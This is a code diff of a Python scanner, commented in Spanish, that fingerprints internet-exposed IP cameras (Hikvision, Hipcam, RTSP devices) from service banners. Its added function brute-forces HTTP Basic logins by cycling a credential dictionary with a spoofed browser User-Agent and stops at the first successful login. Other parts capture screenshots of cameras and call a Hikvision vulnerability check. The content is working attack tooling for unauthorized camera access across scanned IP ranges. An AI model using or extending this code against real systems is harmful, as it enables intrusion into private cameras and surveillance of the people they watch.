@@ -123,57 +123,49 @@ else:
         ip = command.ip_pattern.replace('*', '{}').format(*parts)
         ip_queue.put(ip)
 
-        
 def is_camera(ip, port, banner):
     try:
-        # Buscar la cadena "ETag:" en el banner
-        if "Webs" in banner and "ETag:" in banner:
-            return(f"Camara-Hikvision/DVR")
-        if "IPCAM" in banner:
-            return(f"Camara-IPCAM")
-        if "HTTP/1.0 401 Unauthorized" in banner:
-            return(f"401-Probando_BruteForce")
-        if 'WWW-Authenticate: Basic realm="index.html"' in banner:
-            return(f"Camara-Auntenticacion-401")
-        if "Camera:" in banner:
-            return(f"Camara-Found")
-        if "camera:" in banner:
-            return(f"Camara-Found")
-        if "Model:" in banner:
-            return(f"Camara-Found")
-        if "HTTP/1.0 302 Found" in banner:
-            return(f"Camara[?]")
-        if "WWW-Authenticate: Basic realm=\"index.html\"" in banner:
-            return(f"Camara-Hikvision/DVR")
-        if "/doc/page/login.asp?_" in banner:
-            return(f"Camara-Hikvision/DVR")
-        if "-//W3C//DTD XHTML 1.0 Transitional//EN" in banner:
-            return("Camara-IPCAM")
-        if "WWW-Authenticate: Basic realm=\"streaming_server\"" in banner:
-            return(f"Camara-Auntenticacion-401")
-        if "Server: Hipcam RealServer/V1.0" in banner:
-            return(f"Camara-Hipcam")
-        if "Network Camera with Pan/Tilt" in banner:
-            return(f"Camara-Network")
-        if "Boa/0.94.14rc21" in banner:
-            return(f"Camara-Found")
-        if "Plugin:" in banner:
-            return(f"Camara-Found")
-        if "Expires:" in banner:
-            return(f"Camara-Found")
-        if "unknown" in banner:
-            return(f"unkown")
+        banner_lower = banner.lower()  # Convertir solo una vez a minúsculas
 
-
-        # Buscar palabras clave en el banner
-        keywords = ["camera", "ActiveX", "Camera:", "Model:"]  # Agrega aquí las palabras clave que deseas buscar
-        for keyword in keywords:
-            if keyword in banner.lower():  # Convertir a minúsculas para una búsqueda insensible a mayúsculas y minúsculas
-                return(f"Camara-Found")
+        # Condiciones específicas
+        if "rtsp/1.0 400 method not allowed" in banner_lower and "etag:" in banner_lower:
+            return "Camara-RTSP"
+        if "rtsp/1.0 400 bad request" in banner_lower and "etag:" in banner_lower:
+            return "Camara-RTSP"
+        if "webs" in banner_lower and "etag:" in banner_lower:
+            return "Camara-Hikvision/DVR"
+        if "ipcam" in banner_lower:
+            return "Camara-IPCAM"
+        if "http/1.0 401 unauthorized" in banner_lower:
+            return "401-Probando_BruteForce"
+        if 'www-authenticate: basic realm="index.html"' in banner_lower:
+            return "Camara-Autenticacion-401"
+        if "camera:" in banner_lower or "model:" in banner_lower:
+            return "Camara-Found"
+        if "http/1.0 302 found" in banner_lower:
+            return "Camara[?]"
+        if "/doc/page/login.asp?_" in banner_lower:
+            return "Camara-Hikvision/DVR"
+        if "-//w3c//dtd xhtml 1.0 transitional//en" in banner_lower:
+            return "Camara-IPCAM"
+        if 'www-authenticate: basic realm="streaming_server"' in banner_lower:
+            return "Camara-Autenticacion-401"
+        if "server: hipcam realserver/v1.0" in banner_lower:
+            return "Camara-Hipcam"
+        if "network camera with pan/tilt" in banner_lower:
+            return "Camara-Network"
+        if "boa/0.94.14rc21" in banner_lower:
+            return "Camara-Found"
+        if any(kw in banner_lower for kw in ["plugin:", "expires:", "activex", "rtsp"]):
+            return "Camara-Found"
+        if "unknown" in banner_lower:
+            return "unknown"
 
         return False
-    except:
+    except Exception as e:
+        print(f"Error en is_camera: {e}")
         return False
+
 
 # Define your filter criteria (command.FiltroRegion and command.FiltroCiudad) here
 
@@ -201,6 +193,35 @@ class Colors:
     RED = '\033[91m'
     YELLOW = '\033[93m'
 
+
+def enviar_solicitud_individual(ip, port, url, carga_cancelada, resultados):
+    for usuario, contraseña in usuarios.items():
+        try:
+            credentials = base64.b64encode(f'{usuario}:{contraseña}'.encode('utf-8')).decode('utf-8')
+            
+            headers = {
+                'Authorization': f'Basic {credentials}',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'es-ES,es;q=0.9',
+                'Connection': 'close'
+            }
+
+            response = requests.get(url, headers=headers, stream=True, timeout=0.5)
+            response.raise_for_status()
+
+            if response.status_code == 200:
+                manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cancelada, resultados)
+
+                # Detener la exploración después de encontrar la primera vulnerabilidad
+                if len(resultados) > 0:
+                    return
+            else:
+                pass
+
+        except requests.exceptions.RequestException:
+            resultados.append(None)
 
 def enviar_solicitud(ip, port, carga_cancelada, resultados):
     urls = [
@@ -882,11 +903,19 @@ def scan(ip, ports):
 
                         if command.args.has_screenshot == 'all' and command.args.has_screenshot is not None:
                             screenshot = capture_screenshot(ip, port)
+                            
+                        banners_cam = {
+						    "HTTP/1.0 401 Unauthorized Access Denied",
+						    "HTTP/1.1 401 Unauthorized",
+						    "RTSP/1.0 405 Method Not Allowed",
+						    "RTSP/1.0 400 Method Not Allowed",
+						    "RTSP/1.0 400 Bad Request"
+						}
 
                         if is_camera(ip, port, banner) and (not "HTTP/1.0 302 Found" in banner and not "unknown" in banner):
                             if command.args.has_screenshot == 'cam' and command.args.has_screenshot is not None and "HTTP/1.1 401 Unauthorized" not in banner:
                                 capture_screenshot(ip, port, usuario=None, contraseña=None)
-                            if "HTTP/1.0 401 Unauthorized Access Denied" in banner or "HTTP/1.1 401 Unauthorized" in banner or "HTTP/1.1 401 Unauthorized" in banner:
+                            if any(b.lower() == banner.lower() for b in banners_cam):
                                 cam = verificar_respuesta_200(ip, port, tiempo_cancelacion=1)
                             print(f"{Fore.GREEN}[+]Camara-Encontrada{Style.RESET_ALL}")
                             hikvision_vulnerable = check_vuln_hikvision(ip, port)
